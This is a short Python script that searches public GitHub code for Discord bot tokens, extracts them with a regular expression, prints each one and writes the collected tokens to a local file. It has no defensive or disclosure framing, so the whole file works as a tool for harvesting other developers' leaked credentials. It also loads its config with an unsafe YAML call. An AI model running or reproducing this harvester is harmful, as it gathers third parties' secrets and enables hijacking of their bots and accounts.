import yaml
from github import Github
import base64
import re

TOKEN_RE = re.compile('M[A-Za-z0-9-_.]{58}')

with open('config.yml', 'r') as f:
    cfg = yaml.load(f)

gh = Github(cfg['gh_username'], cfg['gh_password'])
tokens = []
for f in gh.search_code('discord Mz'):
    try:
        code = base64.b64decode(f.content).decode()
        token = re.search(TOKEN_RE, code).group(0)
        tokens.append(token)
        print('Found token %s' % token)
    except:
        print('Error parsing result.')

with open('tokens.txt', 'w') as f:
    f.write('\n'.join(list(set(tokens))))
